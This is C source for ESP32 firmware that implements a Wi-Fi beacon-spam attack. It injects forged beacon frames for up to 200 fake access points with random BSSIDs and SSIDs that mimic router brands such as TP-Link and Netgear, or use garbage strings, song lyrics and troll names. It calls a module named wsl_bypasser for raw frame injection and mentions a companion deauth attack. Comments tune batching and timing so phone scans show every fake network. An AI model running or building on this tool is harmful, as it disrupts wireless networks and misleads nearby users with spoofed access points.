/**
 * @file attack_beacon_spam.c
 * @author SameerAlSahab (sameeralsahab54@gmail.com)
 * @date 8-5-2026
 * @copyright Copyright (c) 2026
 */

#include "attack_beacon_spam.h"
#include "wsl_bypasser.h"
#include "esp_wifi.h"
#include "esp_timer.h"
#include "esp_random.h"
#include "esp_log.h"
#include <string.h>

static const char *TAG = "beacon_spam";
static esp_timer_handle_t beacon_timer_handle;

#define MAX_SPAM_APS 200
typedef struct {
    uint8_t ssid[33];
    uint8_t ssid_len;
    uint8_t bssid[6];
} spam_ap_t;

static spam_ap_t spam_pool[MAX_SPAM_APS];
static uint16_t active_spam_count = 20;

/* Frames actually injected per timer tick. Calibrated against the deauth
 * path's own proven ceiling (up to 50 small ~26-byte frames per 100ms tick,
 * see DEAUTH_INTENSITY_MAX in attack_method.c) — beacon frames here run up
 * to 128 bytes, several times larger, so a much lower per-tick count keeps
 * each burst well inside one tick's real airtime instead of spilling into
 * the next and backing up the driver's TX queue. */
#define BEACON_BATCH_SIZE 25
/* Rotating cursor into spam_pool — see timer_send_beacon(). */
static uint16_t spam_offset = 0;


static const char *base_names[] = { "TP-Link", "Linksys", "Netgear", "ASUS", "D-Link", "Home", "Office", "Starlink", "EastWest" };
static const char *suffixes[] = { "_WiFi", "-Guest", "-5G", "_Secure", "" };
static const char *emojis[] = { "🔥","📶","🚀","✨","⚡" };


static const char *rick_lyrics[] = {
    "Never Gonna Give You Up", "Never Gonna Let You Down",
    "Never Gonna Run Around", "And Desert You",
    "Never Gonna Make You Cry", "Never Gonna Say Goodbye",
    "Never Gonna Tell A Lie", "And Hurt You"
};


static const char *troll_names[] = {
    "FBI Surveillance Van 04", "Virus.exe", "Get Off My LAN",
    "Free Public WiFi", "Loading...", "Searching...", "Click for virus"
};

static void generate_ssid_by_mode(uint8_t *ssid, uint8_t *length, beacon_spam_mode_t mode, int index) {
    char final[33] = {0};

    switch(mode) {
        case BEACON_MODE_COMMON: {
            int b = esp_random() % (sizeof(base_names)/sizeof(base_names[0]));
            int s = esp_random() % (sizeof(suffixes)/sizeof(suffixes[0]));
            snprintf(final, sizeof(final), "%s%s", base_names[b], suffixes[s]);
            if ((esp_random() % 100) < 10) {
                strncat(final, emojis[esp_random()%5], sizeof(final)-strlen(final)-1);
            }
            break;
        }
        case BEACON_MODE_GARBAGE: {
            const char charset[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_+-=[]{}|;";
            int len = 8 + (esp_random() % 12);
            for (int i = 0; i < len; i++) final[i] = charset[esp_random() % (sizeof(charset)-1)];
            break;
        }
        case BEACON_MODE_RICK_ROLL: {
            strncpy(final, rick_lyrics[index % (sizeof(rick_lyrics)/sizeof(rick_lyrics[0]))], 32);
            break;
        }
        case BEACON_MODE_SECURITY: {
            strncpy(final, troll_names[index % (sizeof(troll_names)/sizeof(troll_names[0]))], 32);
            break;
        }
    }

    size_t len = strlen(final);
    if (len > 32) len = 32;
    memcpy(ssid, final, len);
    *length = len;
}

/* Sends one BATCH of the pool per tick instead of the whole pool every
 * time. With a large count (e.g. 200), blasting all of them back-to-back in
 * a single 100ms window used to take far longer than 100ms of real airtime
 * to actually transmit, so esp_timer's next tick would fire before the
 * previous burst finished — the TX queue backs up and only the
 * early-indexed APs in the loop ever reliably go out, which is exactly why
 * a phone scan only ever showed a handful of the configured networks no
 * matter how high the count was set. Round-robining a fixed, calibrated
 * batch guarantees every configured AP gets its own dedicated tick(s)
 * within a bounded, predictable cycle time instead of fighting over one
 * oversized burst. */
static void timer_send_beacon(void *arg) {
    uint8_t chan = 1;
    wifi_second_chan_t sec;
    esp_wifi_get_channel(&chan, &sec);

    uint16_t n = active_spam_count < BEACON_BATCH_SIZE ? active_spam_count : BEACON_BATCH_SIZE;
    for (uint16_t i = 0; i < n; i++) {
        uint16_t idx = spam_offset % active_spam_count;
        wsl_bypasser_send_beacon_frame(spam_pool[idx].bssid, spam_pool[idx].ssid, spam_pool[idx].ssid_len, chan);
        spam_offset++;
    }
}

void attack_beacon_spam_start(uint8_t count, beacon_spam_mode_t mode) {
    active_spam_count = (count > 0 && count <= MAX_SPAM_APS) ? count : 20;
    spam_offset = 0;

    for (int i = 0; i < active_spam_count; i++) {
        generate_ssid_by_mode(spam_pool[i].ssid, &spam_pool[i].ssid_len, mode, i);
        for (int j = 0; j < 6; j++) spam_pool[i].bssid[j] = esp_random() & 0xFF;
        spam_pool[i].bssid[0] = (spam_pool[i].bssid[0] & 0xFE) | 0x02;
    }

    const esp_timer_create_args_t args = { .callback = &timer_send_beacon };
    esp_timer_create(&args, &beacon_timer_handle);
    /* 50ms tick (was 100ms) — with the round-robin batching above, a shorter
     * period means a full cycle through a large pool completes faster (e.g.
     * 200 APs / 25 per tick = 8 ticks -> 400ms instead of 800ms to give
     * every configured AP at least one beacon), so scans converge on the
     * complete set of fake networks sooner. */
    esp_timer_start_periodic(beacon_timer_handle, 50000);
    uint32_t cycle_ms = ((active_spam_count + BEACON_BATCH_SIZE - 1) / BEACON_BATCH_SIZE) * 50;
    ESP_LOGI(TAG, "Beacon spam started. Mode: %d, %u APs, full cycle ~%lums", mode, active_spam_count, (unsigned long) cycle_ms);
}

void attack_beacon_spam_stop() {
    if (beacon_timer_handle) {
        esp_timer_stop(beacon_timer_handle);
        esp_timer_delete(beacon_timer_handle);
        beacon_timer_handle = NULL;
    }
    ESP_LOGI(TAG, "Beacon spam stopped.");
}
